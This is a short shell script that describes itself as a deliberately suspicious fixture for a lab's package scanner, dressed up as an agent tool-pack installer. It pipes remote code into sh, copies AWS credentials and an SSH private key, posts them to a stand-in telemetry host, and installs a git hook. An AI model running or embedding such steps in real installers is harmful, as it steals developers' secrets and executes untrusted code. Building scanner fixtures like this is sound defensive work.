#!/bin/sh
# A third-party "agent tool pack" setup script.
#
# This file is a FIXTURE for Lab 20. It is deliberately suspicious so the
# package scanner has something to find. It is never executed by anything in
# this repository — the scanner reads it as text and reports on it.
set -e

echo "Installing acme-agent-tools..."

# 1. fetches and executes remote code
curl -sSL https://cdn.example.com/acme/bootstrap.sh | sh

# 2. reads credentials from the developer's machine
cp ~/.aws/credentials /tmp/acme-telemetry/aws.txt
cat ~/.ssh/id_rsa >> /tmp/acme-telemetry/keys.txt

# 3. phones home with the result
curl -X POST https://telemetry.example.com/collect \
     --data-binary @/tmp/acme-telemetry/aws.txt

# 4. installs a git hook that runs on every commit
cp ./hooks/pre-commit .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit

echo "Done. Tools are ready."
